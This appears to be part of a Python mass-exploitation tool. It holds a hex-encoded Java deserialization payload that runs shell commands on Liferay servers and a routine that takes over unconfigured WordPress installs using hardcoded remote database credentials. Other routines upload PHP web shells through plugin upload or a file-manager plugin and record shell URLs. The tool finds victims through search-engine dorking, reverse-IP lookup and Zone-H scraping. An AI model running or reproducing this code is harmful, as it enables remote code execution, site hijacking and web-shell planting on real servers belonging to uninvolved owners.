6563743B90CE589F1073296C02000078700000000074000B6E6577496E7374616E6365757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007371007E00137571007E00180000000174000A4A61766153637269707474000F676574456E67696E6542794E616D657571007E001B00000001767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017404567661722063757272656E74546872656164203D20636F6D2E6C6966657261792E706F7274616C2E736572766963652E53657276696365436F6E746578745468726561644C6F63616C2E67657453657276696365436F6E7465787428293B0A76617220697357696E203D206A6176612E6C616E672E53797374656D2E67657450726F706572747928226F732E6E616D6522292E746F4C6F7765724361736528292E636F6E7461696E73282277696E22293B0A7661722072657175657374203D2063757272656E745468726561642E6765745265717565737428293B0A766172205F726571203D206F72672E6170616368652E636174616C696E612E636F6E6E6563746F722E526571756573744661636164652E636C6173732E6765744465636C617265644669656C6428227265717565737422293B0A5F7265712E73657441636365737369626C652874727565293B0A766172207265616C52657175657374203D205F7265712E6765742872657175657374293B0A76617220726573706F6E7365203D207265616C526571756573742E676574526573706F6E736528293B0A766172206F757470757453747265616D203D20726573706F6E73652E6765744F757470757453747265616D28293B0A76617220636D64203D206E6577206A6176612E6C616E672E537472696E6728726571756573742E6765744865616465722822636D64322229293B0A766172206C697374436D64203D206E6577206A6176612E7574696C2E41727261794C69737428293B0A7661722070203D206E6577206A6176612E6C616E672E50726F636573734275696C64657228293B0A696628697357696E297B0A20202020702E636F6D6D616E642822636D642E657865222C20222F63222C20636D64293B0A7D656C73657B0A20202020702E636F6D6D616E64282262617368222C20222D63222C20636D64293B0A7D0A702E72656469726563744572726F7253747265616D2874727565293B0A7661722070726F63657373203D20702E737461727428293B0A76617220696E70757453747265616D526561646572203D206E6577206A6176612E696F2E496E70757453747265616D5265616465722870726F636573732E676574496E70757453747265616D2829293B0A766172206275666665726564526561646572203D206E6577206A6176612E696F2E427566666572656452656164657228696E70757453747265616D526561646572293B0A766172206C696E65203D2022223B0A7661722066756C6C54657874203D2022223B0A7768696C6528286C696E65203D2062756666657265645265616465722E726561644C696E6528292920213D206E756C6C297B0A2020202066756C6C54657874203D2066756C6C54657874202B206C696E65202B20225C6E223B0A7D0A766172206279746573203D2066756C6C546578742E676574427974657328225554462D3822293B0A6F757470757453747265616D2E7772697465286279746573293B0A6F757470757453747265616D2E636C6F736528293B0A7400046576616C7571007E001B0000000171007E00237371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878;\"}","name":"A","cmd":"{\"/expandocolumn/update-column\":{}}","type":"1"}
                headers2 = {"Connection":"close","cmd2":""+command+"","Content-Type":"application/x-www-form-urlencoded"}
                response2 = session.post(""+url+"/api/jsonws/invoke", data=paramsPost, headers=headers2,verify=False)
                if "Exception" not in response2.text:
                    #print("Status code:   %i" % response2.status_code)
                    #print(response2.content)
                    if response2.status_code == 200:
                        if 'bash:' in response2.text:
                            print('%s[+] %s %s~> %sLinux Server' % (g,x,c,d))
                            cmd = 'whoami'
                            headers2 = {"Connection":"close","cmd2":""+cmd+"","Content-Type":"application/x-www-form-urlencoded"}
                            response3 = session.post(""+url+"/api/jsonws/invoke", data=paramsPost, headers=headers2,verify=False)
                            if "exception" not in response3.text:
                                print(str(g)+'[+] W0oWo0w got: '+str(d)+response3.text.replace('\n', ''))
                                with open('Vulns/liferay-linux.txt', 'a+') as f :
                                    f.write(x+'|Linux|'+response3.text)
                            else:
                                print("%s[-] %s ~> Payload has not worked on this system%s" %(c,x,d))
                        elif 'batch file.' in response2.text:
                            print('%s[+] %s %s~> %sWindows Server' % (g,x,c,d))
                            cmd = 'whoami'
                            headers2 = {"Connection":"close","cmd2":""+cmd+"","Content-Type":"application/x-www-form-urlencoded"}
                            response3 = session.post(""+url+"/api/jsonws/invoke", data=paramsPost, headers=headers2,verify=False)
                            if "exception" not in response3.text:
                                print(str(g)+'[+] W0oWo0w got: '+str(d)+response3.text.replace('\n', ''))
                                with open('Vulns/liferay-win.txt', 'a+') as f :
                                    #url.replace('http://', '').replace('https://', '').replace('/')
                                    f.write(x+'|Windows|'+response3.text)
                            else:
                                print("%s[-] %s ~> Payload has not worked on this system%s" %(c,x,d))
                        else:
                            print("%s[-] %s ~> Sorry Not Vuln%s" % (r,x,d))
                else:
                    print("%s[-] %s ~> Payload has not worked on this system%s" %(c,x,d))
            else:
                print("%s[-] %s ~> Sorry Not Vuln" % (r,x))
        except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout, requests.exceptions.ContentDecodingError):
            print (str(r)+'[-] '+x + ' ~> timeout')
            pass
        except(requests.exceptions.TooManyRedirects):
            pass

    def WpInstall(self,site, Email):
        session = requests.Session()
        HOST = 'remotemysql.com'
        USER = 'WHTM6wafoP'
        PASS = 'WQQAnzbFNx'[::-1]
        DB = 'WHTM6wafoP'
        username = 'u1337'
        password = 'uAdmin@123'
        RandomStringForPREFIX = str('wp_' + str(self.ran(8)) + '_')
        try:
            DATA = {'dbname': DB,'uname': USER,
            'pwd': PASS,
            'dbhost': HOST,
            'prefix': RandomStringForPREFIX,
            'language': 'en_US',
            'submit': 'Submit'
            }
            A = session.post(site+ '/wp-admin/setup-config.php?step=2', data=DATA, headers=Headers, timeout=10)
            POSTDATA_Install = {'weblog_title': 'installed|jex',
            'user_name': username,
            'admin_password': password,
            'pass1-text': password,
            'admin_password2': password,
            'pw_weak': 'on',
            'admin_email': Email,
            'Submit': 'Install+WordPress',
            'language': 'en_US'
            }
            session.post(site + '/wp-admin/install.php?step=2', data=POSTDATA_Install, headers=Headers, timeout=25)
            time.sleep(0.2)
            source = session.get(site + '/wp-login.php', timeout=10, headers=Headers).text
            if 'installed|jex' in str(source):
               open("Vulns/wp-install-success.txt", "a").write(site + '/wp-login.php\n  Username: {}\n  Password: {}\n------------------------------------------\n'.format(username, password))
               self.wpupload(site,username,password)
        except:
            pass

    def enum(url):

        try:

            for i in range(5):
                enum = urllib.urlencode({'cs_uid': i, 'action': 'cs_employer_ajax_profile'})
                data = requests.post(url + "/wp-admin/admin-ajax.php", data=enum, headers=Headers, verify=False)
                login = re.findall(r'name="display_name" value=\"(.*?)\"',str(data.text))
                for user in login:
                    return user

        except Exception as Exx:
            print(Exx)

    def wpupro(self,req,site):
        try:         
            url=site+'/wp-admin'
            #izo = self.ran(10) + '.php'
            files = {'pluginzip': (izo, uploader.encode('utf-8'))}
            xq = str(datetime.date(datetime.now()))
            xq = xq.split('-')
            dir = url.replace("/wp-admin","")
            ass = dir+"/wp-content/uploads/"+xq[0]+"/"+xq[1]+"/"+izo
            asss = dir+"/wp-content/uploads/"+izo
            #req = requests.session()
            try:
                url2 = url+"/plugin-install.php?tab=upload"
                result = req.get(url2,timeout=10).text
                action = url+"/update.php?action=upload-plugin"
                patern = r'<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"'
                ok = re.findall(patern,result)
                upload = req.post(action,files=files,data={"_wpnonce":ok[0]},timeout=15)
                if title in req.get(ass).text:
                    #print(green+" [+] Uploaded: "+ass)
                    print(la5dhar +'[WP]'+ ass + '  [ Upload Shell]'+ '\n')
                    file = open("Vulns/Shells.txt","a")
                    file.write(ass+"\n")
                    file.close()
                elif title in req.get(asss).text:
                    print(green+" [+] Uploaded: "+asss)
                    file = open("Vulns/Shells.txt","a")
                    file.write(asss+"\n")
                    file.close()
                              
                else:
                    print(la7mar+" [+] Not Uploaded: "+url)                        
            except Exception as e:
                print(str(e))
                print(la7mar+" [+] Not Uploaded: "+url)        
        except Exception as e:
            print(str(e))

    def wpupload(self,site,usr,pwd):
        sad='.phP'
        casox = self.ran(10) + '.php',self.ran(10) + '.php5',self.ran(10) + '.php7',self.ran(10) + sad,self.ran(10) + '.php4',self.ran(10) + '.phtml'
        for izo in casox:
            try:
                url=site+'/wp-login.php'
                #izo = self.ran(10) + '.php'
                files = {'pluginzip': (izo, uploader.encode('utf-8'))}
                xq = str(datetime.date(datetime.now()))
                xq = xq.split('-')
                dir = url.replace("/wp-login.php","")
                ass = dir+"/wp-content/uploads/"+xq[0]+"/"+xq[1]+"/"+izo
                asss = dir+"/wp-content/uploads/"+izo
                post = {"log":usr,"pwd":pwd}
                req = requests.session()
                try:
                    login = req.post(url,data=post,timeout=10)
                    if 'wordpress_logged_in_' in str(login.cookies) or 'action=logout' in str(login.text):
                        print(la5dhar +'[WP]'+ url + ' +++++++++++++ [Login Succes]'+ '\n')
                        with open('Vulns/wplogins.txt', 'a') as XW:
                            XW.write(url + ' user:'+usr+ ' pass:'+pwd+'\n')
                        url2 = login.url+"/plugin-install.php?tab=upload"
                        result = req.get(url2,timeout=10).text
                        action = login.url+"/update.php?action=upload-plugin"
                        patern = r'<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"'
                        ok = re.findall(patern,result)
                        upload = req.post(action,files=files,data={"_wpnonce":ok[0]},timeout=15)
                        if title in req.get(ass).text:
                            #print(green+" [+] Uploaded: "+ass)
                            print(la5dhar +'[WP]'+ ass + '  [ Upload Shell]'+ '\n')
                            file = open("Vulns/Shells.txt","a")
                            file.write(ass+"\n")
                            file.close()
                        elif title in req.get(asss).text:
                            print(green+" [+] Uploaded: "+asss)
                            file = open("Vulns/Shells.txt","a")
                            file.write(asss+"\n")
                            file.close()

                        elif 'file_manager_advanced_ui' in login.text:
                             print(la5dhar +'[WP]'+ login.url + '  [ FOUND File manager]'+ '\n')
                             caddr={"Host": login.url.replace("/wp-admin/","").replace("https://","").replace("http://","").replace("/",""),"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0","Referer":login.url+"admin.php?page=file_manager_advanced_ui"}
                             url2x = login.url+"admin-ajax.php"
                             urlxc = login.url+'admin.php?page=file_manager_advanced_ui#elf_l1_Lw'
                             resulthjy = req.get(urlxc,timeout=20)
                             tokenkal = re.findall('id="fmakey" value="(.*?)"', resulthjy.text)
                             urlta = login.url+'admin-ajax.php?action=fma_load_fma_ui&_fmakey='+tokenkal[0]+'&cmd=mkfile&name=asss.phP&target=l1_d3AtY29udGVudC91cGxvYWRzLzIwMjEvMDE&reqid=177193a6bb0255'
                             resultw = req.get(urlta,headers=caddr,timeout=25)
                             time.sleep(0.2)
                             urltb = login.url+'admin-ajax.php?action=fma_load_fma_ui&_fmakey='+tokenkal[0]+'&cmd=get&target=l1_d3AtY29udGVudC91cGxvYWRzLzIwMjEvMDEvYXNzcy5waFA&conv=0&_t=1611035996'
                             resultww = req.get(urltb,headers=caddr,timeout=25)
                             time.sleep(0.2)
                             #resultwyat = req.post(url2x,headers=caddr,timeout=25)
                             resultwyat = req.post(url2x,headers=caddr,data={"action":"fma_load_fma_ui","_fmakey":tokenkal[0],"cmd":"put","target":"l1_d3AtY29udGVudC91cGxvYWRzLzIwMjEvMDEvYXNzcy5waFA","encoding":"UTF-8","content":uploader.encode('utf-8'),"reqid":"177193da9f92aa"},timeout=25)
                             if title in req.get('https://leannforst.com/wp-content/uploads/2021/01/asss.phP',timeout=15).text:
                                 print(la5dhar +'[WP]'+ url + '  [Success Upload]'+ '\n')
                                 open("Vulns/shells.txt", "a").write('https://leannforst.com/wp-content/uploads/2021/01/asss.phP'+'\n')
                                 sys.exit()
  
                        else: 
                            print("now install Plugin")

                            ahmedo = {"Host": login.url.replace("/wp-admin/","").replace("https://","").replace("http://","").replace("/",""),"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding": "gzip, deflate, br","Connection": "keep-alive","Upgrade-Insecure-Requests": "1"}
                            urla = login.url+"plugin-install.php?s=File+Manager+Advanced&tab=search&type=term"
                            result = req.get(urla,timeout=25)
                            tokenkk = re.findall('install-plugin&#038;plugin=file-manager-advanced&#038;_wpnonce=(.*?)" aria-label=', result.text)
                            time.sleep(0.1)
                            urlg = login.url+"update.php?action=install-plugin&plugin=file-manager-advanced&_wpnonce="+tokenkk[0]
                            resultw = req.get(urlg,headers=ahmedo,timeout=25)
                            if 'Successfully' in resultw.text:
                                print(la5dhar +'[WP]'+ url + '  [install Advanced File Manager ]'+ '\n')
                                time.sleep(0.2)
                                print("waiting now actived plugin......\n")
                                urlaa = login.url+"plugins.php?plugin_status=inactive"
                                resulthj = req.get(urlaa,timeout=20)
                                tokenkkkt = re.findall('file-manager-advanced%2Ffile_manager_advanced.php&amp;plugin_status=inactive&amp;paged=1&amp;s&amp;_wpnonce=(.*?)" id="activate', resulthj.text)
                                time.sleep(0.3)

                                urlggr = login.url+"plugins.php?action=activate&plugin=file-manager-advanced%2Ffile_manager_advanced.php&plugin_status=inactive&paged=1&s&_wpnonce="+tokenkkkt[0]
                                result = req.get(urlggr,timeout=20)
                                time.sleep(0.3)
                                resultxr = req.get(login.url,timeout=20)
                                if 'WPide' in resultxr.text:
                                    print(la5dhar +'[WP]'+ login.url + '  [ Activited Advanced File Manager ]'+ '\n')

                                url2x = login.url+"admin-ajax.php"
                                urlxc = login.url+'admin.php?page=file_manager_advanced_ui#elf_l1_Lw'
                                resulthjy = req.get(urlxc,timeout=20)
                                tokenkal = re.findall('id="fmakey" value="(.*?)"', resulthjy.text)
                                cadd={"Host": login.url.replace("/wp-admin/","").replace("https://","").replace("http://","").replace("/",""),"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0","Referer":login.url+"admin.php?page=file_manager_advanced_ui"}
                                urlta = login.url+'admin-ajax.php?action=fma_load_fma_ui&_fmakey='+tokenkal[0]+'&cmd=mkfile&name=asss.phP&target=l1_d3AtY29udGVudC91cGxvYWRzLzIwMjEvMDE&reqid=177193a6bb0255'
                                resultw = req.get(urlta,headers=cadd,timeout=25)
                                time.sleep(0.2)
                                urltb = login.url+'admin-ajax.php?action=fma_load_fma_ui&_fmakey='+tokenkal[0]+'&cmd=get&target=l1_d3AtY29udGVudC91cGxvYWRzLzIwMjEvMDEvYXNzcy5waFA&conv=0&_t=1611035996'
                                resultww = req.get(urltb,headers=cadd,timeout=25)
                                time.sleep(0.2)
                                resultwyat = req.post(url2x,headers=cadd,timeout=25)
                                if title in req.get(login.url.replace("/wp-admin/","")+'/wp-content/uploads/2021/01/asss.phP',timeout=15).text:
                                   print(la5dhar +'[WP]'+ url + '  [Success Upload]'+ '\n')
                                   open("Vulns/shells.txt", "a").write(login.url.replace("/wp-admin/","")+'/wp-content/uploads/2021/01/asss.phP'+'\n')
                                   sys.exit()
                              
                    else:
                        print(la7mar+" [+] Not Login: "+url)                        
                except Exception as e:
                    print(str(e))
                    print(la7mar+" [+] Login Failed: "+url)        
            except Exception as e:
                print(str(e))

    def slowprint(self):

        try:
            import requests, os, sys, json
            from datetime import datetime
            from bs4 import BeautifulSoup as bs
            from multiprocessing.pool import ThreadPool
        except:
            os.system('pip2 install requests bs4')
        try:
            xxx = input(" Enter ip List : ")
            #op=open(xxx.read().splitlines()
            op=open(xxx,'r').read().splitlines()
            file=input('%s[%s•%s] Save results : '%(W0,C0,W0))
            if file == '':
                exit('%s[%s!%s] You stupid'%(W0,R0,W0))
            print()
            for ip in op:
                web=requests.post('https://tools.hack.co.id/reverseip/',data={'domain':ip}).text
                parse=bs(web,'html.parser').find('table').findAll('a')
                for domains in parse:
                    open(file,'a+').write(domains['href']+'\n')
                print ('%s[%s•%s] Reversing %s ...'%(W0,P0,W0,ip))
                print ('%s[%s•%s] %s domains found for %s'%(W0,P0,W0,len(parse),ip))
            print()
            print ('%s[%s•%s] Done, saved in %s'%(W0,C0,W0,file))
            lists = file
            url = open(lists, 'r').readlines()
            readsplit = open(lists).read().splitlines()
            self.giti(readsplit,url)
        except requests.exceptions.ConnectionError:
            pass
        except IndexError:
            exit('%s[%s!%s] %sUse : python2 rev.py target.txt \n%s[%s!%s] %sFill in target.txt with ip not with website'%(W1,R1,W1,W0,W1,R1,W1,W0))
        except IOError:
            pass
        except KeyboardInterrupt:
            pass

    def google(self):
        try:
            print('   %s[%s1%s] Single\n   %s[%s2%s] Mass'%(W,G,W,W,G,W))
            self.chc=input('\n%s[%s?%s] Choice : '%(W,R,W))
            if self.chc == '1':self.dork=input('%s[%s?%s] Input dork : '%(W,G,W));print();self.dorker(self.dork);list(self.filter())
            elif self.chc == '2':
                self.file=input('%s[%s?%s] Input file : '%(W,G,W))
                for self.dork in open(self.file).read().splitlines():
                    print('\n%s[%s!%s] %sDorking %s%s\n'%(W,Y,W,Y,self.dork,W))
                    self.dorker(self.dork)
                list(self.filter())
            else:exit('    Bye goblok')
        except IndexError:exit('\n%s[%s!%s] Use : python2 %s dork.txt'%(W,R,W,sys.argv[0]))
        except IOError:exit('%s[%s×%s] File does not exist'%(W,R,W))
        except KeyboardInterrupt:exit('\n%s[%s!%s] Exit'%(W,R,W))
    def dorker(self,search):
        liste = []
        page=0
        while True:
            page+=10
            get_token=requests.get('https://cse.google.com/cse.js?cx=partner-pub-2698861478625135:3033704849',headers={'Referer': 'https://cse.google.com/cse?cx=partner-pub-2698861478625135:3033704849','User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.'+str(random.randint(0000,3333))+'.100 Safari/537.36'}).text
            cse_token=re.findall(r'\"cse_token\": \"(.*?)\"',get_token)
            ngedork=requests.get('https://cse.google.com/cse/element/v1?num=10&hl=en&cx=partner-pub-2698861478625135:3033704849&safe=off&cse_tok=%s&start=%s&q=%s&callback=x'%(cse_token[0],page,search),headers={'Referer': 'https://cse.google.com/cse?cx=partner-pub-2698861478625135:3033704849','User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.'+str(random.randint(0000,3333))+'.100 Safari/537.36'}).text
            results=re.findall(r'\"unescapedUrl\": \"(.*?)\"',ngedork)
            if results==[]:break
            for url in results:
                dhon = url
                url = url.replace("https://", "")
                url = url.replace("http://", "")
                url = url.replace("www.", "")
                url = url.split("/")
                url = url[0]
                if url not in liste:
                   liste.append(url)
                   print(url);open('.dork','a+').write(dhon+'\n')
    def filter(self):
        print('\n%s[%s*%s] Result filter menu\n\n    %s[%s1%s] Full path\n    %s[%s2%s] Just domain'%(W,R,W,W,G,W,W,G,W))
        self.chc=input('\n%s[%s?%s] Choice : '%(W,R,W))
        if self.chc == '1':self.podo('.dork');os.system('rm -rf .p && rm -rf .dork');#exit('\n%s[%s✓%s] Done, saved in results.txt'%(W,G,W))
        elif self.chc == '2':
             self.get_domain();self.podo('.p');os.system('rm -rf .p && rm -rf .dork');#print('\n%s[%s✓%s] Done, saved in results.txt'%(W,G,W))
             lists = 'results.txt'
             url = open(lists, 'r').readlines()
             readsplit = open(lists).read().splitlines()
             self.giti(readsplit,url)
        else:self.podo('.dork');os.system('rm -rf .p && rm -rf .dork');exit('\n%s[%s✓%s] Done, saved in results.txt'%(W,G,W))
    def get_domain(self):
        for site in open('.dork').read().splitlines():
            try:_p=site.split('/')[0]+'//'+site.split('/')[2];open('.p','a+').write(_p+'\n')
            except:continue
    def podo(self,file):
        podo=[]
        for site_ in open(file).read().splitlines():
     
            try:
                if 'pastebin' in site_:continue
                elif 'microsoft' in site_:continue
                elif 'exploit-db' in site_:continue
                elif 'wordpress.org' in site_:continue
                elif 'medium' in site_:continue
                elif 'packetstormsecurity' in site_:continue
                elif 'pinterest' in site_:continue
                elif 'facebook' in site_:continue
                elif 'youtube' in site_:continue
                elif 'wordfence' in site_:continue
                elif 'debian' in site_:continue 
                elif 'bitnami' in site_:continue 
                elif 'github' in site_:continue 
                elif 'cxsecurity' in site_:continue 
                elif 'reddit' in site_:continue
                elif 'portswigger' in site_:continue
                elif 'acunetix' in site_:continue  
                elif 'slideshare' in site_:continue 
                elif 'cvedetails' in site_:continue
                elif 'jetpack' in site_:continue
                elif 'stackoverflow' in site_:continue
                elif 'twitter' in site_:continue               
                else:podo.append(site_);open('results.txt','a+').write(site_+'\n')
            except:continue	


    def bigsearch(self):
        try:
            print('Bing Dorker Priv')
            print('%s[%s1%s] Single\n%s[%s2%s] Mass'%(W,G,W,W,G,W))
            self.chc=input('\n%s[%s?%s] Choice : '%(W,R,W))
            if self.chc == '1':self.single()
            elif self.chc == '2':self.mass()
            else:exit('bye goblok')
        except requests.exceptions.ConnectionError:exit('%s[%s!%s] Check internet'%(W,R,W))
        except IOError:exit('%s[%s×%s] File does not exist'%(W,R,W))
        except KeyboardInterrupt:exit('\n%s[%s!%s] Exit'%(W,R,W))
    
    def single(self):

        self.dork=input('%s[%s?%s] Input dork : '%(W,G,W))
        self.page=input('%s[%s?%s] Input page : '%(W,G,W))
        c=0
        print()
        for taek in range(int(self.page)):
            c+=11
            res=requests.get('http://www.bing.com/search?q='+self.dork+'&first='+str(c),headers={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'})
            soup=BeautifulSoup(res.text,'html.parser').find_all('ol')
            if 'There are no results for' in str(soup):print('%s[%s!%s] There are no results for %s'%(W,R,W,dork));continue
            for crot in soup:
                try:
                    for site in crot.find_all('a'):
                        if '/search?q' in site['href']:continue
                        else:print('    '+site['href']);open('1','a+').write(site['href']+'\n')
                except:break
        if os.path.exists('1')==False:exit('\n%s[%s!%s] There are no results'%(W,R,W))
        same=[]
        for domain in open('1').read().split('\n'):
            if 'bing' in domain:continue
            elif 'microsoft' in domain:continue
            elif 'exploit-db' in domain:continue
            elif 'wordpress.org' in domain:continue
            elif 'medium' in domain:continue
            elif 'packetstormsecurity' in domain:continue
            elif 'pinterest' in domain:continue
            elif 'facebook' in domain:continue
            elif 'youtube' in domain:continue
            elif 'wordfence' in domain:continue
            elif 'debian' in domain:continue 
            elif 'bitnami' in domain:continue 
            elif 'github' in domain:continue 
            elif 'acunetix' in domain:continue 
            elif 'reddit' in domain:continue
            elif 'portswigger' in domain:continue
            elif 'cxsecurity' in domain:continue  
            elif 'slideshare' in domain:continue 
            elif 'cvedetails' in domain:continue
            elif 'pastebin' in domain:continue
            elif 'jetpack' in domain:continue
            elif 'blogspot.com' in domain:continue
            elif 'twitter' in domain:continue
            elif 'stackoverflow.com' in domain:continue
            elif domain in same:continue
            else:same.append(domain);open('resultsbing.txt','a+').write(domain+'\n')
        os.system('rm -rf 1')
        print('\n%s[%s*%s] Result filter menu\n\n    %s[%s1%s] Full path\n    %s[%s2%s] Just domain'%(W,R,W,W,G,W,W,G,W))
        self.chc=input('\n%s[%s?%s] Choice : '%(W,R,W))
        if self.chc == '1':exit('\n%s[%s✓%s] Done, saved in resultsbing.txt'%(W,G,W))
        elif self.chc == '2':
            podo=[]
            for site in open('resultsbing.txt').read().split('\n'):
                try:
                    dadi=site.split('/')[0]+'//'+site.split('/')[2]
                    if dadi in podo:continue
                    else:podo.append(dadi);open('results_domain.txt','a+').write(dadi+'\n')
                except:pass
            #exit('\n%s[%s✓%s] Done, saved in results_domain.txt'%(W,G,W))
            lists = 'results_domain.txt'
            url = open(lists, 'r').readlines()
            readsplit = open(lists).read().splitlines()
            self.giti(readsplit,url)
        else:exit('\n%s[%s✓%s] Done, saved in resultsbing.txt'%(W,G,W))    

    def mass(self):

        self.file=open(input('%s[%s?%s] Input file : '%(W,G,W))).read().splitlines()
        page=input('%s[%s?%s] Input page : '%(W,G,W))
        c=0
        for self.dork in self.file:
            print('\n%s[%s!%s] %sProccess self.dork %s%s\n'%(W,Y,W,Y,self.dork,W))
            for taek in range(int(page)):
                c+=11
                res=requests.get('http://www.bing.com/search?q='+self.dork+'&first='+str(c), headers={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'})
                soup=BeautifulSoup(res.text, 'html.parser').find_all('ol')
                if 'There are no results for' in str(soup):print('%s[%s!%s] There are no results for %s'%(W,R,W,self.dork));continue
                for crot in soup:
                    try:
                        for site in crot.find_all('a'):
                            if '/search?q' in site['href']:continue
                            else:print('    '+site['href']);open('1','a+').write(site['href']+'\n')
                    except:break
        same=[]
        if os.path.exists('1')==False:exit('\n%s[%s!%s] There are no results'%(W,R,W))
        for domain in open('1').read().split('\n'):
            if 'bing' in domain:continue
            elif 'microsoft' in domain:continue
            elif 'exploit-db' in domain:continue
            elif 'wordpress.org' in domain:continue
            elif 'medium' in domain:continue
            elif 'packetstormsecurity' in domain:continue
            elif 'pinterest' in domain:continue
            elif 'facebook' in domain:continue
            elif 'youtube' in domain:continue
            elif 'wordfence' in domain:continue
            elif 'debian' in domain:continue 
            elif 'bitnami' in domain:continue 
            elif 'github' in domain:continue 
            elif 'acunetix' in domain:continue 
            elif 'reddit' in domain:continue
            elif 'portswigger' in domain:continue
            elif 'acunetix' in domain:continue  
            elif 'slideshare' in domain:continue 
            elif 'cvedetails' in domain:continue
            elif 'pastebin' in domain:continue
            elif 'jetpack' in domain:continue
            elif 'blogspot.com' in domain:continue
            elif 'twitter' in domain:continue
            elif domain in same:continue
            else:same.append(domain);open('resultsbing.txt','a+').write(domain+'\n')
        os.system('rm -rf 1')
        print('\n%s[%s*%s] Result filter menu\n\n    %s[%s1%s] Full path\n    %s[%s2%s] Just domain'%(W,R,W,W,G,W,W,G,W))
        self.chc=input('\n%s[%s?%s] Choice : '%(W,R,W))
        if self.chc == '1':exit('\n%s[%s✓%s] Done, saved in resultsbing.txt'%(W,G,W))
        elif self.chc == '2':
            podo=[]
            for site in open('resultsbing.txt').read().split('\n'):
                try:
                    dadi=site.split('/')[0]+'//'+site.split('/')[2]
                    if dadi in podo:continue
                    else:podo.append(dadi);open('results_domain.txt','a+').write(dadi+'\n')
                except:pass
            #exit('\n%s[%s✓%s] Done, saved in results_domain.txt'%(W,G,W))
            lists = 'results_domain.txt'
            url = open(lists, 'r').readlines()
            readsplit = open(lists).read().splitlines()
            self.giti(readsplit,url)
        else:exit('\n%s[%s✓%s] Done, saved in resultsbing.txt'%(W,G,W))
    def giti(self,readsplit,url):            

        try:
            start = timer()
            print ('   [+] Executing Exploit for ' + la5dhar + str( len( readsplit ) ) + la5dhar + ' Urls.\n')
            ThreadPool = Pool(20)
            ThreadPool.map(self.cms, url)                

        except KeyboardInterrupt:
            exit()

            print( 'Total URLs Scanned    : ' + str( len( readsplit ) ) )
            print( 'Script Execution Time : ' + str ( timer() - start ) + ' seconds' )
            
    def zonehh(self):
        PHPSESSID = ''
        ZHE = ''
        if os.path.isfile('.PHPSESSID'): self.PHPSESSID = open('.PHPSESSID','r').read().strip()
        if os.path.isfile('.ZHE'): self.ZHE = open('.ZHE','r').read().strip()
        else:
             print('Input PHPSESSID')
             self.PHPSESSID = input('PHPSESSID=')
             open(".PHPSESSID", "a").write(self.PHPSESSID+'\n')
             print('Input ZHE')
             self.ZHE = input('ZHE=')
             open(".ZHE", "a").write(self.ZHE+'\n')
            

        
 
        a = 0
        total = 0
        self.my_cook = {'ZHE': self.ZHE,'PHPSESSID': self.PHPSESSID}
    
        print("""
            |---| Grabb Sites From Zone-h |--|
            \033[91m[1] \033[95mGrabb Sites By Notifier
            \033[91m[2] \033[95mGrabb Sites By Onhold
            """)    

        self.sec = int(input("Choose Section: "))
        if self.sec == 1:
            self.notf = input("\033[95mEntre notifier: \033[92m")


            for i in range(1, 51):
                dz = requests.get(urlm + self.notf +"/page=" + str(i), cookies=self.my_cook)
                dzz = dz.text
                print((urlm + self.notf +"/page=" + str(i)))
                if '<html><body>-<script type="text/javascript"' in dzz:
                    print("Change Cookies Please")
                    os.remove(".PHPSESSID")
                    os.remove(".ZHE")
                    print('Input PHPSESSID')
                    self.PHPSESSID = input('PHPSESSID=')
                    open(".PHPSESSID", "a").write(self.PHPSESSID+'\n')
                    print('Input ZHE')
                    self.ZHE = input('ZHE=')
                    open(".ZHE", "a").write(self.ZHE+'\n')
                elif '<input type="text" name="captcha" value=""><input type="submit">' in dzz:
                    print("Entre Captcha In Zone-h From Ur Browser :/")
                    sys.exit()    
                else:
                    Hunt_urls = re.findall('<td>(.*)\n							</td>', dzz)
                    if '/mirror/id/' in dzz:
                        for xx in Hunt_urls:
                            qqq = xx.replace('...','')
                            #print (qqq)
                            print('    ['  + '*' + '] ' + qqq.split('/')[0])
                        
                            with open( self.notf + '.txt', 'a') as rr:
                                rr.write("http://" + qqq.split('/')[0] + '\n')
                                while i == 50:
                                    i +=1
                                    lists = self.notf + '.txt'
                                    url = open(lists, 'r').readlines()
                                    readsplit = open(lists).read().splitlines()
                                    self.giti(readsplit,url)
                        
                    else:
                        print("Grabb Sites Completed !!")
                        lists = notf + '.txt'
                        url = open(lists, 'r').readlines()
                        readsplit = open(lists).read().splitlines()
                        self.giti(readsplit,url)
                   
        elif self.sec == 2:
            print(":* __Grabb Sites By Onhold__ ^_^")
            for qwd in range(1, 51):
                rb = requests.get(urllm + "/page=" + str(qwd) , cookies=self.my_cook)
                dzq = rb.text

                if '<html><body>-<script type="text/javascript"' in dzq:
                    print("Change Cookies Plz")
                
                
                elif "captcha" in dzq:
                    print("Entre captcha In Your Browser Of Site [zone-h.org]")
                else:
                    Hunt_urlss = re.findall('<td>(.*)\n							</td>', dzq)
                    #Hunt_urlss = re.findall('<td>(.*)\n                            </td>', dzq)
